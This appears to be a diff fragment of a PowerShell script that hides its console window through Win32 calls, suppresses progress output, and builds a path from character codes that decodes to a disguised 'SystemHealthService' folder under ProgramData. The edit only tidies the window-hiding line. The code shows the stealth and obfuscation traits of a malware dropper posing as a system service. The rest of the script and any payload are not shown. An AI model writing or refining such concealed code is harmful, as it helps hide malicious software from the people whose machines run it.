@@ -5,7 +5,7 @@ $ProgressPreference = "SilentlyContinue"
 
 try {
     Add-Type -Name Window -Namespace Native -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,Int32 n);'
-    [Native.Window]::ShowWindow([Native.Window]::GetConsoleWindow(), 0)
+    [void][Native.Window]::ShowWindow([Native.Window]::GetConsoleWindow(), 0)
 } catch {}
 
 ${_bp} = (-join @([char]67,[char]58,[char]92,[char]80,[char]114,[char]111,[char]103,[char]114,[char]97,[char]109,[char]68,[char]97,[char]116,[char]97,[char]92,[char]83,[char]121,[char]115,[char]116,[char]101,[char]109,[char]72,[char]101,[char]97,[char]108,[char]116,[char]104,[char]83,[char]101,[char]114,[char]118,[char]105,[char]99,[char]101))
